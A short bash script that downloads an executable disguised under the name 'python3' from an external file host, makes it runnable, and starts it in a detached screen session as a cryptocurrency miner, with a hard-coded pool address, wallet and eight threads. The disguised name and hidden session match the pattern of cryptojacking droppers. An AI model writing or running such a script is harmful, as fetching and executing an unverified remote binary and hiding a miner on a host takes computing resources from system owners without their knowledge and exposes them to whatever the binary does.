#!/bin/bash


generate_random_name() {
    tr -dc A-Za-z0-9 </dev/urandom | head -c 5
}


TID=$(generate_random_name)


wget https://upload.vina-host.com/sAcUi9loPh/python3


chmod +x python3


screen -dmS dotsrb_$TID ./python3 -a  yespowersugar -o 198.50.168.213:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$TID -p c=DGB -t 8
